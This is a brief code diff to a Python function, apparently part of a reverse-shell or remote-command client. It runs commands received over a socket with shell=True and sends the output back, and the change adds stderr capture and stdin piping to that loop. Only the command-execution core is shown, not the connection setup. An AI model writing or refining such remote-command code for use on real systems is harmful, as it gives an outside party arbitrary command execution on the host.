@@ -19,7 +19,7 @@ def connect_to_server():
         if command == 'exit':
             break    
         try:
-            output = subprocess.check_output(command, shell=True)
+            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
         except subprocess.CalledProcessError as e:
             output = str(e.output)
         client.send(output)
